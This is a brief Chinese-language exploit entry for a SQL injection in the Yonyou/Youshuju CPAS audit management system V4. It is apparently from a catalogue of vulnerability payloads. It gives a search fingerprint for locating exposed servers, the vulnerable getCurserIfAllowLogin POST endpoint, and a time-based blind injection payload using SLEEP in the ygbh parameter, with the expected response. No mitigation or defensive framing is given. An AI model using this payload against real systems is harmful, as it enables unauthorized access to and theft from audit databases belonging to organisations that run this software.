# 用友-友数聚科技CPAS审计管理系统V4getCurserIfAllowLogin存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`body="CPAS审计管理系统"`
- **请求**：`POST /cpasm4/cpasList/getCurserIfAllowLogin HTTP/1.1`

**Payload**
```
ygbh=adm11'XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z
```
- **响应特征**：200